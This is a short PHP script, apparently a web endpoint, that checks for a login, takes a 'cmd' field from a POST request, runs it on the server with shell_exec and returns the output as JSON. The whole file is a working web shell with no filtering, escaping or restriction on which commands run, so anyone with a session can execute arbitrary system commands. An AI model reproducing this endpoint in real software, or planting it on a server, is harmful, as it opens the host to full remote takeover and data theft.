<?php
require_once __DIR__.'/lib/auth.php';
require_login();

header('Content-Type: application/json; charset=utf-8');

$cmd = $_POST['cmd'] ?? '';
if(!$cmd){
    echo json_encode(['ok'=>false,'error'=>'cmd_empty']);
    exit;
}

$out = shell_exec($cmd.' 2>&1');
echo json_encode(['ok'=>true,'cmd'=>$cmd,'output'=>$out]);
